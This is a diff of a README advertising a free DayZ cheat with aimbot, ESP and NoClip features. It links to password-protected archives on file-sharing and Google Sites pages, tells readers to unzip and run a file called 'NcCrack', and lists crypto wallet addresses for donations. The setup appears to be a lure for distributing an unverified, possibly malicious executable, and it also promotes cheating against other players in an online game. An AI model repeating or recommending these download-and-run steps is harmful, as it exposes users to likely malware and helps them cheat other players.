@@ -1,81 +1,133 @@
 # DayZ-HACK-AIM-ESP
-Our cheat supports windows 7/10/11
 
+# IMPORTANT 
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-# Some of the features of Free HYROCOPT Hack
-![image](https://user-images.githubusercontent.com/126517061/222338492-3febf65f-e51e-459c-96ed-9650e34b0722.png)
+# Support the author ( On chips )
+
+- BTC - bc1q7kmj3pyhcm2n02z6p7gxvusqv55pt7vcgxe6ut
+
+- ETH - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+- TRC-20 ( Usdt ) - TRYhDuV6qVcHQjfqEgF15w72TdxCMLDt9b
+
+- BNB - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# How to install?
+
+- Visit our website
+
+- Download the archive 
+
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
+
+- Run the file ( NcCrack )
+
+- Launch the game
+
+- In-game INSERT button
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# SYSTEM REQUIREMENTS
+
+- Processor | Intel | Amd Processor |
+
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
+
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# Functional
 
 # AIMBOT
-Enable Silent Aimbot
 
-Enable Default Aimbot
+- Magic Bullet
+- On Zombies
+- On Players
+- On Animals
+- TeamCheck
+- On Animals
+- Draw FOV
+- Bone
+- FOV
+- Distance
 
-Fov
+# VISUALS
 
-Smooth
+- PlayerESP
+- Box Style
+- Skeleton
+- Filled
+- Distance
+- NickName
+- Weapon
+- Head ESP
+- Town ESP
+- Zombie ESP
+- Skeleton
+- Distance
+- Car ESP
+- Corpse ESP
+- Inventory ESP
 
-Aim on Players
+# LOOT
 
-Aim on Zombies
+- Ammo
+- Items
+- Clothes
+- Backpack
+- Medicines
+- Food
+- Weapons
+- Building
+- Car items
+- Attachments
+- Distance settings
 
-Spoofer free #VISUALS:
 
-Enable Esp Box on Players
+# MISC
 
-Enable Esp box on Zombies
+- Debug Camera
+- NoClip
+- Always Day
+- No Grass
 
-Esp Loot
+Update from 1.20.2023
 
-FOV
+# ChangeLog [US]
 
-No Grass
+- Added the Town ESP function
+- Added the Filled function
+- Added the Head ESP function
+- Added Magic Bullet on animals
+- Added a Friend list for the aimbot
+- Added support for any languages
+- Added the Inventory function
+- Added the Panic Key function
+- Increased the display distance of cars to 1000m
+- Corrected the display of the CornerBox
+- Corrected the display of Skeleton ESP
+- Corrected the colors for LOOT ESP
+- Fixed a problem with Car in the LOOT tab when things for cars were not displayed on the ground
+- Fixed a problem with Building in the LOOT tab when things for cars were not displayed on the ground
+- Fixed a problem with Attachments and Ammo in the LOOT tab when things were displayed incorrectly
+- Corrected the choice of dice in the aimbot when Neck and Head were mixed up in places
+- Fixed crashes
+- Improved stability
+- SpeedHack removed
 
-Loot Distance
-
-Esp Cars
-
-Esp Skeleton
-
-Enable Esp Distance
-
-Enable show FOV
-
-Esp Locations
-
-Villages
-# Updates;
-[+] Menu Completly Changed.
-
-[+] Fixed Aim Lock Line.
-
-[+] Fixed Aim Bones [ Now it’s actually head ].
-
-[+] SnapLines Repositioned.
-
-[+] Added Air Stuck.
-
-[+] U finally can turn off vehicle esp.
-
-[+] Silent Aim and Bullet Teleport will be up very soon just wait.
-
-[+] Updated to latest patch.
-
-[+] Major Improvments.
-# [How to use HYROCOPT Hacks Free?]
-To use this DayZ hacks for free You must turn on your Discord Overlay first of all.
-
-Download the archive
-
-Unpack the archive to any location
-
-Run the file
-
-Launch the game
-
-In-game INSERT button
+![aim](https://user-images.githubusercontent.com/119938147/213409897-64729a6d-f177-43e4-9414-629483390b63.png)
+![esp](https://user-images.githubusercontent.com/119938147/213409902-492292b0-c965-474e-9d26-6eaa29dff7f7.png)
+![loot](https://user-images.githubusercontent.com/119938147/213409908-38050ded-aebb-4073-8e9b-bbe9e420b068.png)
